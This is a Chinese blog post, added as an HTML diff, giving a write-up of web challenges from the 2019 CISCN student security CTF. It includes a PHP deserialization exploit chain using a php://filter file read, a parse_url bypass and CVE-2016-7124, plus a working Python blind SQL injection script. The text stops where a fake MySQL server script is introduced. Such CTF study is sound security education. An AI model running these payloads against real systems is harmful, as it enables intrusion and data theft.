@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"findneo.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="上周末(4&#x2F;20~4&#x2F;21)战队难得一起再打了个比赛，大概是大学生活里最后一场了吧，这里复盘下三个Web。  JustSoso使用伪协议 (http:&#x2F;&#x2F;xxx.changame.ichunqiu.com&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php) 读取到index.php和hint.php。 inde">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第十二届全国大学生信息安全竞赛创新实践能力赛 web writeup">
+<meta property="og:url" content="https://findneo.github.io/190427-ciscn2019-web-wp/index.html">
+<meta property="og:site_name" content="闲言语">
+<meta property="og:description" content="上周末(4&#x2F;20~4&#x2F;21)战队难得一起再打了个比赛，大概是大学生活里最后一场了吧，这里复盘下三个Web。  JustSoso使用伪协议 (http:&#x2F;&#x2F;xxx.changame.ichunqiu.com&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php) 读取到index.php和hint.php。 inde">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://findneo.github.io/190427-ciscn2019-web-wp/1556296722250.png">
+<meta property="og:image" content="https://findneo.github.io/190427-ciscn2019-web-wp/1556301976594.png">
+<meta property="og:image" content="https://findneo.github.io/190427-ciscn2019-web-wp/1556334139275.png">
+<meta property="og:image" content="https://findneo.github.io/190427-ciscn2019-web-wp/1556337395749.png">
+<meta property="og:image" content="https://findneo.github.io/190427-ciscn2019-web-wp/1556338767937.png">
+<meta property="og:image" content="https://findneo.github.io/190427-ciscn2019-web-wp/1556339105434.png">
+<meta property="og:image" content="https://findneo.github.io/190427-ciscn2019-web-wp/1556339247851.png">
+<meta property="og:image" content="https://findneo.github.io/190427-ciscn2019-web-wp/1556340949356.png">
+<meta property="og:image" content="https://findneo.github.io/190427-ciscn2019-web-wp/1556339847768.png">
+<meta property="og:image" content="https://findneo.github.io/190427-ciscn2019-web-wp/1556339857688.png">
+<meta property="article:published_time" content="2019-04-26T16:35:37.000Z">
+<meta property="article:modified_time" content="2021-03-09T13:32:32.000Z">
+<meta property="article:author" content="findneo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://findneo.github.io/190427-ciscn2019-web-wp/1556296722250.png">
+
+<link rel="canonical" href="https://findneo.github.io/190427-ciscn2019-web-wp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>第十二届全国大学生信息安全竞赛创新实践能力赛 web writeup | 闲言语</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">闲言语</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/190427-ciscn2019-web-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/findneo.png">
+      <meta itemprop="name" content="findneo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="闲言语">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          第十二届全国大学生信息安全竞赛创新实践能力赛 web writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-04-27 00:35:37" itemprop="dateCreated datePublished" datetime="2019-04-27T00:35:37+08:00">2019-04-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-09 21:32:32" itemprop="dateModified" datetime="2021-03-09T21:32:32+08:00">2021-03-09</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>上周末(4/20~4/21)战队难得一起再打了个比赛，大概是大学生活里最后一场了吧，这里复盘下三个Web。</p>
+<p><img data-src="1556296722250.png" alt="1556296722250"></p>
+<h1 id="JustSoso"><a href="#JustSoso" class="headerlink" title="JustSoso"></a>JustSoso</h1><p>使用伪协议 (<code>http://xxx.changame.ichunqiu.com/index.php?file=php://filter/convert.base64-encode/resource=index.php</code>) 读取到index.php和hint.php。</p>
+<p>index.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&quot;payload&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;Missing parameter&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;hack attacked!!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$payload</span>))&#123;  </span><br><span class="line">    <span class="variable">$url</span> = parse_url(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    parse_str(<span class="variable">$url</span>[<span class="string">&#x27;query&#x27;</span>],<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$value</span>)) &#123; </span><br><span class="line">    	    <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">    	    <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$payload</span> = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Missing parameters&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>hint.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;<span class="variable">$k</span> = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Waking up\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="variable">$handle</span>; </span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token_flag</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">				<span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="literal">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>整体思路是利用Handle实例反序列化时调用的析构函数触发getFlag()，但有几个阻碍。</p>
+<ul>
+<li><p><code>$this-&gt;token === $this-&gt;token_flag</code> 需要这两个属性值相等才能读到文件，而token值不变，token_flag的值总是在变化。</p>
+</li>
+<li><p>```php<br>$url = parse_url($_SERVER[‘REQUEST_URI’]);<br>parse_str($url[‘query’],$query);</p>
+<pre><code>foreach($query as $value)&#123;
+    if (preg_match(&quot;/flag/&quot;,$value)) &#123; 
+        die(&#39;stop hacking!&#39;);
+        exit();
+    &#125;
+&#125;
+</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  url中不能包含flag字样，而反序列化后的字符串必然会包含 &#96;flag&#96; 。</span><br><span class="line"></span><br><span class="line">- &#96;&#96;&#96;php</span><br><span class="line">      public function __wakeup()&#123;</span><br><span class="line">  		foreach(get_object_vars($this) as $k &#x3D;&gt; $v) &#123;</span><br><span class="line">              $this-&gt;$k &#x3D; null;</span><br><span class="line">          &#125;</span><br><span class="line">          echo &quot;Waking up\n&quot;;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+<p>字符串反序列化时会自动调用对象中的 <code>__wakeup</code> 方法，这里 <code>__wakeup</code> 方法将所有属性值置空，下面 <code>__destruct</code> 的时候就找不到 <code>$handle</code> 了。</p>
+</li>
+</ul>
+<h2 id="整体方法"><a href="#整体方法" class="headerlink" title="整体方法"></a>整体方法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> Flag(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$target</span>=<span class="string">&quot;[url]/index.php?file=hint.php&amp;payload=&quot;</span> . urlencode(serialize(<span class="keyword">new</span> handle(<span class="variable">$f</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$target</span>;</span><br></pre></td></tr></table></figure>
+
+<p>访问输出的链接。</p>
+<h2 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h2><p><code>__construct</code> 是在对象创建时自动调用，在反序列化时并不会被调用，这给了我们操纵token值的机会。</p>
+<p>由于<code>rand(1,10000)</code>  返回值可能性并不多，可以采用爆破。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> Flag(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$f</span>-&gt;token=md5(<span class="string">&quot;6666&quot;</span>);</span><br><span class="line"><span class="variable">$target</span>=<span class="string">&quot;[url]/index.php?file=hint.php&amp;payload=&quot;</span> . urlencode(serialize(<span class="keyword">new</span> handle(<span class="variable">$f</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$target</span>;</span><br></pre></td></tr></table></figure>
+
+<p>重复访问输出的链接。</p>
+<p>当然并不是说跑够一万次就一定能碰上，如果手气不好也可能总遇不到。</p>
+<p><img data-src="1556301976594.png" alt="1556301976594"></p>
+<p>那么可以采用每一次将token赋为不同的值，遍历全部一万种可能，直观上感觉这样做还碰不到的可能性会小很多。</p>
+<p>上面是大力出奇迹的做法，还有比较优雅的做法：将token指向token_flag的引用或相反，那么当一者改变时另一个会跟随。</p>
+<p><img data-src="1556334139275.png" alt="1556334139275"></p>
+<h2 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h2><p>正则看起来绕不过去，直接访问 <code>Flag.php</code> 返回404，说明服务端是大小写敏感的。突破点在于 <code>parse_url</code> 遇到畸形url时会解析失败，那么后面的正则自然不起作用了。</p>
+<p><img data-src="1556337395749.png" alt="1556337395749"></p>
+<h2 id="问题三"><a href="#问题三" class="headerlink" title="问题三"></a>问题三</h2><p>PHP有过一个漏洞 <code>CVE-2016-7124</code> ，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过 <code>__wakeup</code> 的执行。</p>
+<p>参考文章：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=72663">Sec Bug #72663 Create an Unexpected Object and Don’t Invoke __wakeup() in Deserialization</a>  </li>
+<li><a target="_blank" rel="noopener" href="http://blog.knownsec.com/2016/09/sugarcrm-v6-5-23-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">SugarCRM v6.5.23 PHP反序列化对象注入漏洞</a> </li>
+</ul>
+<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;...&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> Flag(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$f</span>-&gt;token=&amp;<span class="variable">$f</span>-&gt;token_flag;</span><br><span class="line"><span class="variable">$g</span>=serialize(<span class="keyword">new</span> handle(<span class="variable">$f</span>));</span><br><span class="line"><span class="variable">$gg</span>=str_replace(<span class="string">&quot;:1:&#123;s&quot;</span>, <span class="string">&quot;:2:&#123;s&quot;</span>, <span class="variable">$g</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;http://[url]///index.php?file=hint.php&amp;payload=&quot;</span> . urlencode(<span class="variable">$gg</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">http://[url]///index.php?file=hint.php&amp;payload=O%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%224e4b5fbbbb602b6d35bea8460aa8f8e5%22%3Bs%3A10%3A%22token_flag%22%3BR%3A4%3B%7D%7D</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="1556338767937.png" alt="1556338767937"></p>
+<h1 id="全宇宙最简单的SQL"><a href="#全宇宙最简单的SQL" class="headerlink" title="全宇宙最简单的SQL"></a>全宇宙最简单的SQL</h1><p>基于exp()函数报错的盲注，加上在未知列名情况下注出数据的技巧，可得到user表第二列数据为 F1AG@1s-<br>at_/fll1llag_h3r3 ，作为admin的密码登录后进入后台，可以连接远程数据库，伪造MySQL服务的可以读取flag<br>文件。知识点在DDCTF2017和DDCTF2019出现过。</p>
+<p>记录个盲注脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line">url = <span class="string">&#x27;http://39.97.227.64:52105/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;40&quot;</span>,</span><br><span class="line"><span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>,</span><br><span class="line"><span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://39.106.224.151:52105&quot;</span>,</span><br><span class="line"><span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line"><span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;</span>,</span><br><span class="line"><span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://39.106.224.151:52105/&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line"><span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=uj6gjpnpsham8ihv8alnegm8e0&quot;</span>,</span><br><span class="line"><span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &quot;&#x27;^exp(&#123;&#125;-ascii(substr((select ),&#123;&#125;,1)))#&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;^exp(&#123;&#125;-ascii(substr((select `2`  from (select 1,2 union select * from user)orz#),&#123;&#125;,1)))#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&#x27;^exp(&#123;&#125;-ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),&#123;&#125;,1)))#&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">e = <span class="number">709</span></span><br><span class="line">c = <span class="number">126</span></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> j &lt; <span class="number">30</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">str</span>(j)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        p[<span class="string">&#x27;username&#x27;</span>] = payload.<span class="built_in">format</span>(e + c, j)</span><br><span class="line">        r = requests.post(url, data=p, headers=headers)</span><br><span class="line">        <span class="comment"># print r.headers[&#x27;Content-Length&#x27;]</span></span><br><span class="line">        <span class="comment"># print r.content</span></span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">&quot;数据库操作失败&quot;</span>, r.content) == []:</span><br><span class="line">            res += <span class="built_in">chr</span>(c)</span><br><span class="line">            <span class="built_in">print</span> res</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        c -= <span class="number">1</span></span><br><span class="line">        <span class="comment"># time.sleep(1)</span></span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">    c = <span class="number">126</span></span><br></pre></td></tr></table></figure>
+
+<p>盲注结果：</p>
+<p><img data-src="1556339105434.png" alt="1556339105434"></p>
+<p>MySQL服务端伪造脚本：</p>
